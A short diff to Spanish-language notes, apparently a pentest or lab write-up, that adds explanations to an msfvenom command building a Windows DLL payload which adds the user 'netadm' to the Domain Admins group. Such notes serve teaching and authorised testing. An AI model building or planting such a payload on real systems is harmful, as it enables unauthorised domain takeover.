@@ -46,7 +46,9 @@ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain'
 
 * `msfvenom` — generador de payloads de Metasploit.
 * `-p windows/x64/exec` — payload: ejecutar comando en Windows x64.
-* `cmd='...'` — el comando que el payload ejecutará: en este caso `net group "domain admins" netadm /add /domain` añade el usuario `netadm` al grupo Domain Admins en el dominio.
+* `cmd='...'` — el comando que el payload ejecutará: en este caso `net group "domain admins" netadm /add /domain` añade el usuario `netadm` al grupo Domain Admins en el dominio (el usuario debe existir).
+* `/add` Indica añadir el usuario al grupo especificado
+* `/domain` Le dice a `net group` que la operación se haga en el controlador de dominio y no en la máquina local.
 * `-f dll` — formato de salida: DLL.
 * `-o adduser.dll` — archivo de salida.
 
